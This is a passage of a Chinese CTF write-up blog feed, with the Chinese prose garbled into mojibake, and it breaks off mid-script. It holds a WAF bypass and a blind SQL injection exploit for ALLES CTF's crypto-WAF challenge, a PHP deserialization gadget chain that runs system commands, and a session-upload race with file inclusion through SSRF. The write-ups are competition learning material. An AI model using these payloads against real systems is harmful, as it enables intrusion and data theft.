class="string">f&#x27;/notes?deleted=<span class="subst">&#123;note_uuid&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/add_note&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>():</span></span><br><span class="line">    new_note_uuid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    user = g.user[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    body = request.form[<span class="string">&#x27;body&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    commit_db(<span class="string">&#x27;insert into notes (uuid, user, title, body) values (?, ?, ?, ?)&#x27;</span>, </span><br><span class="line">        [new_note_uuid, user, title, body])</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/registerlogin&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registerlogin</span>():</span></span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    pwhash = hashlib.sha256(password.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    user = query_db(<span class="string">&#x27;select * from users where username = ? and password = ?&#x27;</span>, </span><br><span class="line">                    [username, pwhash], one=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="comment"># new user. let&#x27;s create it in the database</span></span><br><span class="line">        new_user_uuid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">        commit_db(<span class="string">&#x27;insert into users (uuid, username, password) values (?, ?, ?)&#x27;</span>, </span><br><span class="line">                [new_user_uuid, username, pwhash])</span><br><span class="line">        user= query_db(<span class="string">&#x27;select * from users where uuid = ?&#x27;</span>, [new_user_uuid], one=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># calculate signature for cookie</span></span><br><span class="line">    key = user[<span class="string">&#x27;uuid&#x27;</span>]</span><br><span class="line">    sig = signature(user[<span class="string">&#x27;uuid&#x27;</span>])</span><br><span class="line">    response = redirect(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;session&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>.<span class="subst">&#123;sig&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–é¢˜ç›®çš„æ—¶å€™ä¼šåˆ›å»ºä¸€ä¸ªflagç”¨æˆ·ï¼Œå¯†ç æœªçŸ¥ï¼Œç„¶åæ’å…¥ä¸€æ¡bodyä¸ºflagçš„notesï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905132320173.png" alt="image-20210905132320173"></p><p>ä¸è¿‡ç»è¿‡å‰é¢çš„åˆ†æï¼Œbodyå’Œtitleå­—æ®µè¿›å…¥æ•°æ®åº“çš„æ˜¯åŠ å¯†è¿‡çš„å¯†æ–‡ã€‚</p><h3 id="å„ç§å°è¯•"><a href="#å„ç§å°è¯•" class="headerlink" title="å„ç§å°è¯•"></a>å„ç§å°è¯•</h3><p>åˆ†æå®Œé¢˜ç›®é€»è¾‘åï¼Œå®¡è®¡æºç ã€‚å¾ˆæ˜æ˜¾åç«¯<code>/notes</code>å¤„orderæ˜¯å”¯ä¸€çš„æ³¨å…¥ç‚¹ï¼Œorder by åé¢å¯ä»¥ç›´æ¥ç”¨ <code>asc,(case when 1 then randomblob(5000000000000) else 1 end)</code> ï¼Œè§‚å¯Ÿæ˜¯å¦è¿”å›erroræ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p><p>äºæ˜¯å¼€å§‹æ³¨å…¥ï¼Œå› ä¸ºè¿‡æ»¤äº†selectï¼Œèµ·åˆæˆ‘çš„payloadæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc,(case when (substr(body,1,1)&#x3D;char(100)) then randomblob(5000000000000) else 1 end)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å‘ç°æ³¨ä¸å‡ºflagçš„å¯†æ–‡ï¼Œ åªèƒ½æ³¨å‡ºæˆ‘è‡ªå·±çš„notesâ€¦ ä»”ç»†çœ‹ä¸‹sqlè¯­å¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_db(<span class="string">f&#x27;select * from notes where user = ? order by timestamp <span class="subst">&#123;order&#125;</span>&#x27;</span>, [g.user[<span class="string">&#x27;uuid&#x27;</span>]])</span><br></pre></td></tr></table></figure><p>order byåé¢å—åˆ° where çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ³¨å‡ºè‡ªå·±ç”¨æˆ·çš„å†…å®¹ã€‚</p><p>è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œå°è¯•ç»•è¿‡wafï¼Œä¸è¿‡wafæœ‰ä¸ªé€’å½’çš„urldecodeï¼Œæ„Ÿè§‰ç»•ä¸è¿‡å»ã€‚ç¿»äº†néæ–‡æ¡£å¯»æ‰¾å¦‚ä½•ä¸ç”¨selectçš„æƒ…å†µä¸‹æ„é€ ä¸€ä¸ªæ–°çš„æŸ¥è¯¢é€»è¾‘ï¼Œä½†æ˜¯æ— æœï¼Œæ„Ÿè§‰è¿™æ¡è·¯æ˜¯æ— è§£çš„ã€‚</p><p>äºæ˜¯æˆ‘æƒ³åˆ°äº†è¯»æ–‡ä»¶ï¼Œè¦æ˜¯èƒ½è¯»æ–‡ä»¶ç›´æ¥è¯»å– /tmp/secretï¼Œå†æŠŠ sqlite.db ç»™æ‹–ä¸‹æ¥ï¼Œå¯ä»¥ç›´æ¥ä¼ªé€  flag ç”¨æˆ·ã€‚</p><p>æœ¬åœ°èµ·ä¸ªç¯å¢ƒï¼Œè¯•è¯•ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/unknown.png" alt="img"></p><p>çœ‹èµ·æ¥å¯ä»¥ï¼æ³¨å…¥è¯•ä¸€ä¸‹ï¼Œå¥½åƒ8å¤ªè¡Œï¼Œçœ‹ä¸‹logï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/unknown-20210905133020008.png" alt="img"></p><p>æ²¡äº‹äº†ï¼Œpython sqlite3 çœ‹èµ·æ¥ä¸æ”¯æŒ readfileâ€¦</p><h3 id="æŸ³æš—èŠ±æ˜"><a href="#æŸ³æš—èŠ±æ˜" class="headerlink" title="æŸ³æš—èŠ±æ˜"></a>æŸ³æš—èŠ±æ˜</h3><p>ç»é˜Ÿé‡Œå¸ˆå‚…çš„å°è¯•ï¼Œç«Ÿç„¶èƒ½ç»•è¿‡WAFä½¿ç”¨selectï¼Œçœ‹çœ‹æ€ä¹ˆåˆ©ç”¨çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;notes%3Forder&#x3D;xxx</span><br></pre></td></tr></table></figure><p>å›è¿‡å¤´çœ‹ä¸‹æºç ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905133345571.png" alt="image-20210905133345571"></p><p>waf æ˜¯é€šè¿‡ request.argså–çš„ï¼Œè€ŒæŠŠ?è¿›è¡Œurlencodeï¼Œåé¢çš„æ•°æ®éƒ½è¢«å½“æˆäº†pathï¼Œè‡ªç„¶å¯ä»¥é€šè¿‡wafã€‚è€Œè¯·æ±‚åç«¯çš„æ—¶å€™ï¼Œpathä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecodeæ‹¼æ¥åˆ°urlåé¢ï¼Œ%3Få˜æˆäº†?ï¼Œåç«¯å°±å¯ä»¥æ­£å¸¸è·å–åˆ°orderå‚æ•°äº†ã€‚ä¸è¿‡æ³¨æ„åé¢è¿˜å¤šä¸€ä¸ª?ï¼Œåœ¨æˆ‘ä»¬æ³¨å…¥çš„æ—¶å€™payloadåé¢è¦åŠ ä¸ªæ³¨é‡Šï¼ŒæŠŠè¿™ä¸ªé—®å·æ³¨é‡Šæ‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p>æ˜¯æˆ‘èœäº†â€¦ å­¦åˆ°äº†ã€‚</p><p>ç»•è¿‡waf ï¼Œé‚£å°±å¥½åŠäº†ï¼Œå­—ç¬¦ä¸²ä¹Ÿä¸éœ€è¦ç”¨CHARæ‹¼æ¥äº†ï¼Œæ„é€ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc,(case when (select substr(body,%s,1)&#x3D;&quot;%s&quot; from notes where user!&#x3D;&#123;userid&#125;) then randomblob(5000000000000) else 1 end)--</span><br></pre></td></tr></table></figure><p>æ³¨å…¥å‡ºflagçš„å¯†æ–‡ï¼Œéœ€è¦æˆ‘ä»¬è¿›è¡Œè§£å¯†ã€‚å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°åˆ é™¤noteå¤„æœ‰ä¸€å¤„å¾ˆå¯ç–‘ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905134422923.png" alt="image-20210905134422923"></p><p>/notesè·¯ç”±æ ¹æœ¬å°±æ²¡æœ‰å¤„ç† deleted å‚æ•°çš„é€»è¾‘ï¼Œå¹¶ä¸”è¿™é‡Œçš„note_uuidæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚redirectå‡½æ•°ï¼š</p><p><img src="/2021/09/05/2021-ALLESCTF/image-20210905134537799.png" alt="image-20210905134537799"></p><p>å¯ä»¥çœ‹åˆ°è¿”å›çš„å†…å®¹é‡ŒåŒ…å«locationï¼Œæ‰€ä»¥/delete_noteè·¯ç”±çš„uuidå‚æ•°å°±æ˜¯ä¸€ä¸ªç”¨äºè§£å¯†çš„åŠŸèƒ½ï¼ŒæŠŠå¯†æ–‡é€šè¿‡uuidå‚æ•°å‘è¿‡å»å°±å¯ä»¥äº†ã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># url = &quot;https://7b0000006f329cb3e773932f-amazing-crypto-waf.challenge.master.allesctf.net:31337/&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000&quot;</span></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&#x27;gmlsec&#x27;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;gmlsec&#x27;</span>&#125;</span><br><span class="line">    resp = s.post(url + <span class="string">&#x27;/registerlogin&#x27;</span>, data=paramsPost, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;gmlsec&#x27;</span> <span class="keyword">in</span> resp.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;gml&quot;</span>, <span class="string">&quot;body&quot;</span>: <span class="string">&quot;gml&quot;</span>&#125;</span><br><span class="line">    response = s.post(url + <span class="string">&quot;/add_note&quot;</span>, data=paramsPost, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_notes</span>(<span class="params">order</span>):</span></span><br><span class="line">    response = s.get(url + <span class="string">&quot;/notes%3Forder=&quot;</span> + order, proxies=proxies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_flag</span>():</span></span><br><span class="line">    userid = s.cookies.get_dict()[<span class="string">&#x27;session&#x27;</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]  <span class="comment"># my user&#x27;s uuid</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    tem = <span class="string">&#x27;desc,(case when (select substr(body,%s,1)=&quot;%s&quot; from notes where user!=&quot;&#123;userid&#125;&quot;) then randomblob(5000000000000) else 1 end)--&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        userid=userid)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&quot;/=:&quot;</span>:</span><br><span class="line">            payload = tem % (i,c)</span><br><span class="line">            <span class="keyword">if</span> get_notes(payload):</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;end!&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;uuid&quot;</span>: cipher&#125;</span><br><span class="line">    response = s.post(url + <span class="string">&quot;/delete_note&quot;</span>, data=paramsPost, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span> response.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    data = get_encrypted_flag()</span><br><span class="line">    dec(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿œç¨‹ç¯å¢ƒäº¤äº’éå¸¸æ…¢ï¼ˆè¿˜æ˜¯httpsï¼‰ï¼Œæœ¬åœ°è·‘æ˜¯å®Œå…¨æ²¡æœ‰é—®é¢˜çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
            <tag> urlç¼–ç ç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 ç¥¥äº‘æ¯wp</title>
      <link href="/2021/08/22/2021-xiangyuncup/"/>
      <url>/2021/08/22/2021-xiangyuncup/</url>
      
        <content type="html"><![CDATA[<p>2021 ç¥¥äº‘æ¯åˆèµ› Web é¢˜è§£ã€‚</p><a id="more"></a><h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/9948#toc-6">https://xz.aliyun.com/t/9948#toc-6</a> ç¬¬å››æ¡é“¾å­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $output;</span><br><span class="line">        <span class="keyword">private</span> $processes = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="keyword">new</span> RunProcess())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $streams = [];</span><br><span class="line">        <span class="keyword">private</span> $seekable = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $remoteStream;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $source;</span><br><span class="line">        <span class="keyword">private</span> $size=<span class="number">-10</span>;</span><br><span class="line">        <span class="keyword">private</span> $buffer;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            $a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /flag.txt&#x27;</span>);&#125;;</span><br><span class="line">            $a = \Opis\<span class="built_in">Closure</span>\serialize($a);</span><br><span class="line">            $b = unserialize($a);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source=$b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨æ£€æµ‹"><a href="#å®‰å…¨æ£€æµ‹" class="headerlink" title="å®‰å…¨æ£€æµ‹"></a>å®‰å…¨æ£€æµ‹</h2><p>ä¸€ä¸ªssrfï¼Œç»è¿‡æµ‹è¯•æ˜¯ file_get_contents.</p><p>æ‰«ç›®å½•ï¼Œ/adminæ˜¯403ï¼Œssrfå»è¯·æ±‚<a href="http://127.0.0.1/admin">http://127.0.0.1/admin</a>ã€‚</p><p>é‡Œé¢ä¸€ä¸ªphpï¼Œæ–‡ä»¶åŒ…å«è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œè€ƒè™‘sessionç«äº‰ä¸Šä¼ +æ–‡ä»¶åŒ…å«ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zefzyj8kapji8067alv.cloudeci1.ichunqiu.com/&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line">rawBody = json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;gmla&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;gml&#x27;</span>&#125;)</span><br><span class="line">headers = &#123;<span class="string">&quot;Origin&quot;</span>: url, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">           <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">           <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zef0qsx7zblq9rh24yv.cloudeci1.ichunqiu.com//login.php&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">           <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">response = session.post(url + <span class="string">&#x27;/login.php&#x27;</span>, data=rawBody, headers=headers, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span>(<span class="params">i</span>):</span></span><br><span class="line">    proxies = &#123;&#125;</span><br><span class="line">    <span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&#x27;gml666&lt;?php system(&quot;/getflag.sh&quot;);?&gt;&#x27;</span>&#125;</span><br><span class="line">    paramsMultipart = [(<span class="string">&#x27;f&#x27;</span>, (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">40000</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;444&quot;</span>&#125;</span><br><span class="line">    response = requests.post(url, data=paramsPost, files=paramsMultipart, cookies=cookies, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span>(<span class="params">i</span>):</span></span><br><span class="line">    filename = <span class="string">&#x27;/tmp/sess_444&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        session.post(url + <span class="string">&quot;/check2.php&quot;</span>, data=&#123;<span class="string">&#x27;url1&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:80/admin/include123.php?u=&#x27;</span> + filename&#125;,</span><br><span class="line">                     proxies=proxies)</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;/preview.php&#x27;</span>, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;gml666&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">    